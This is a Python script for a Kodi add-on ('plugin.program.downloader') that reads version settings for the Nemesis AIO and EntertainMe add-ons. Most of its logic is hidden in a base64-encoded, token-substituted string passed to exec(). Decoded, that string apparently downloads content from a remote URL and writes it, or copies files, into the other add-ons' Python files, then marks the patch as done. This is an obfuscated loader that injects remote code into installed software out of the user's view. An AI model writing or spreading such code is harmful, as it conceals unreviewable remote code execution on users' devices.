import xbmc,xbmcaddon,xbmcvfs,xbmcgui
import os, re, requests, sys
from contextlib import contextmanager

action = sys.argv[1]
addonbase = xbmcaddon.Addon('plugin.program.downloader')
addon_nemesis = xbmcaddon.Addon('plugin.video.nemesisaio')
addon_EntertainMe = xbmcaddon.Addon('plugin.video.EntertainMe')
fix_neme_ver = addonbase.getSetting('okpnneme')
if fix_neme_ver == '' or fix_neme_ver is None:
    fix_neme_ver = '0'
fix_enter_ver = addonbase.getSetting('okpnenter')
if fix_enter_ver == '' or fix_enter_ver is None:
    fix_enter_ver = '0'
neme_ver = addon_nemesis.getAddonInfo('version')
enter_ver = addon_EntertainMe.getAddonInfo('version')


@contextmanager
def busy_dialog():
    xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
    try:
        yield
    finally:
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

def openfile(path_to_the_file):
    try:
        fh = xbmcvfs.File(path_to_the_file)
        contents=fh.read()
        fh.close()
        return contents
    except:
        print("Wont open: %s" % path_to_the_file)
        return None

def savefile(path_to_the_file,content):
    try:
        fh = xbmcvfs.File(path_to_the_file, 'w')
        fh.write(content)  
        fh.close()
    except: print("Wont save: %s" % path_to_the_file)

exec("import re;import base64");exec((lambda p,y:(lambda o,b,f:re.sub(o,b,f.decode('utf-8')))(r"([0-9a-f]+)",lambda m:p(m,y),base64.b64decode("MjQoImQgMzU7ZCA2OCIpOzI0KCg2ZSA1ZCw2OTooNmUgNjIsYixmOjM1LjU5KDYyLGIsZi40YSgnM2EtOCcpKSkoNmQiKFswLTY2LWZdKykiLDZlIDY3OjVkKDY3LDY5KSw2OC4yMCgiNjEiKSkpKDZlIGEsYjpiWzViKCI2YyIrYS4zYygxKSwxNildLCIwfDN8NWV8MWN8MTF8NHwxNXw3fDh8MjV8Mzl8MWR8MjJ8NnxjfDI4fDEwfDMwfDE5fDFifDM2fDIzfDFlfDJ8MjZ8NTF8MzF8NXw2Ynw2MHw5fDMzfDUzfGV8NTh8NWZ8MTJ8M2J8MTR8M2R8MTd8NDF8MTh8MWF8NTZ8MWZ8NDN8NDZ8Mjl8NGR8Mjd8NmF8MmF8MmJ8MmV8MmN8MmR8MmZ8MzJ8NGF8MzR8NTR8Mzd8NWN8Mzh8NWF8M2V8M2Z8NDB8NDR8NDV8NDd8NjN8NDh8NDl8NGJ8NjV8NGN8NGV8NGZ8NTB8NTV8NTd8M2F8NTJ8NjR8MzV8MjF8MTMiLjQyKCJ8IikpKQ==")))(lambda a,b:b[int("0x"+a.group(1),16)],"0|1|getCondVisibility|addon_EntertainMe|executebuiltin|AddonIsEnabled|translatePath|addon_nemesis|8|BaseException|a|b|getAddonInfo|import|fix_neme_ver|f|10|basecontent|busy_dialog|basepypath|repository|setSetting|16|nemesisaio|downloader|getSetting|gknwizard|pinstatus|addonInfo|okpnenter|addonbase|addonname|b64decode|addonPath|enter_ver|resources|exec|neme_ver|openfile|savefile|okpnneme|requests|special|findall|program|content|nemesis|timeout|xbmcvfs|fixpath|System|Passed|addons|re|plugin|except|Builds|action|utf|video|group|match|fixen|GKoBu|gkobu|sleep|split|else|http|copy|join|home|okpn|xmls|decode|repo|name|pass|with|libs|elif|path|xbmc|pin|300|get|not|try|EntertainMe|sub|str|int|def|p|newcontent|updatecheck|fix_enter_ver|M2YgZigpOgoJNGUgMjQoKToKCQkxYyAyMSA8IDk6CgkJCTMgPSA3LmUKCQkJNTcgPSAxMS5kKDMoJzE5JykpCgkJCTU4ID0gNGMuMTkuMmYoNTcsJzM2LjQ4JykKCQkJMmQgPSAzKCc0ZCcpCgkJCTEzID0gNy4xMignMjAnKQoJCQk0ID0gMTgoNTgpCgkJCTFjIDJjIDkgMzMgNDoKCQkJCTUyOgoJCQkJCTIgPSAzMC41MSgnNDU6Ly8yYi41NS80Yi80MC80My80YS80OScsIDM5PTEwKS4zOAoJCQkJCTIgPSAyLjNiKCc1My04JykKCQkJCQkyNyA9IDU2LjM1KCcjIyguKz8pIyMnLCAyKVswXQoJCQkJCTFjIDJjIDQxKDI3KSA8IDQxKDkpOgoJCQkJCQkzMig1OCwyKQoJCQkJCQk1NC4yOSgzZCkKCQkJCQkJNy42KCcyMCcsICcxZicpCgkJCQkJCTE2LjYoJ2YnLCA5KQoJCQkJM2UgMWU6CgkJCQkJMzEKCgk1NC41KGEpCgoKM2YgYigpOgoJMWMgMWQgPCBjOgoJCTMgPSAxLmUKCQk1NyA9IDExLmQoMygnMTknKSkKCQk1OCA9IDRjLjE5LjJmKDU3LCcxNScsICc0ZicsICcyMy40OCcpCgkJMWEgPSAnMzQ6Ly80Ny8zYy8xNC4zNy4yYS8xNS80MicKCQkxMyA9IDEuMTIoJzIwJykKCQk0ID0gMTgoNTgpCgkJMWMgMmMgYyAzMyA0OgoJCQkxMS40NigxYSwgNTgpCgkJCTU0LjI5KDNkKQoJCQkxLjYoJzIwJywgJzFmJykKCQkJMTYuNignYicsIGMpCgoJNTQuNShhKQoKMWMgNTQuMTcoJzNhLjFiKDI2LjQ0KScpOgoJMWMgJzE0LjI1LjI4JyAzMyBhOgoJCWYoKQoJNTAgJzE0LjI1LjIyJyAzMyBhOgoJCWIoKQoJMmU6CgkJNTQuNShhKQoyZToKCTMx|o|py|eu|os|9a|m|base64|y|in|if|0x|r|lambda".split("|")))